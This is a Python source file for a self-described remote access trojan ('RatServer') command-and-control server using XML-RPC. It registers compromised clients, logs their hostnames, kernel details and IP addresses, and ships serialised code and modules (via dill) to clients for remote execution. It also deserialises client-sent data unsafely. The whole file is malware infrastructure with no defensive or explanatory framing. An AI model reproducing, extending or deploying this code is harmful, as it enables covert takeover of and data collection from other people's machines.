#!/usr/local/bin/python3

from xmlrpc import server, client
import socket
import dill
import os
import platform

# server_ip = socket.gethostbyname(socket.gethostname())
server_ip = "0.0.0.0"
server_port = 4000


def convert_to(obj):
    return client.Binary(dill.dumps(obj))


def convert_from(obj):
    return dill.loads(obj.data)


def get_system_information():
    kernel_info = platform.uname()
    ip_address = socket.gethostbyname(kernel_info.node)
    result = [kernel_info, ip_address]
    return result


class Connected_client():

    def __init__(self, hostname, kernel_info, ip_address):
        self.hostname = hostname
        self.kernel_info = kernel_info
        self.ip_address = ip_address


class RatServer:

    def __init__(self, server_ip=server_ip, server_port=server_port):
        self.rat_server = server.SimpleXMLRPCServer((server_ip, server_port),
                                                    allow_none=True)
        self.list_of_clients = []

    def register_client(self, system_info):
        rat_client_system = convert_from(system_info)
        self.list_of_clients.append(Connected_client(hostname=rat_client_system[0].node,
                                                     kernel_info=rat_client_system[0],
                                                     ip_address=rat_client_system[1]))
        print("Added {} to the list of clients".format(rat_client_system[0]))
        for clients in self.list_of_clients:
            print("###################")
            print(clients.hostname)
            for item in clients.kernel_info:
                print(item)
            print(clients.ip_address)
            print("###################")

    def create_client_server(self):
        server_package = (server, RatServer)
        return convert_to(server_package)

    def send_required_libraries(self):
        req_libraries = (os, socket, platform)
        return convert_to(req_libraries)

    def sys_info(self):
        return convert_to(get_system_information)


if __name__ == '__main__':
    rat = RatServer()
    rat.rat_server.register_function(rat.register_client, 'register_client')
    rat.rat_server.register_function(rat.create_client_server, 'create_client_server')
    rat.rat_server.register_function(rat.send_required_libraries, 'rcv_req_libs')
    rat.rat_server.register_function(rat.sys_info, 'sys_info')
    rat.rat_server.serve_forever()
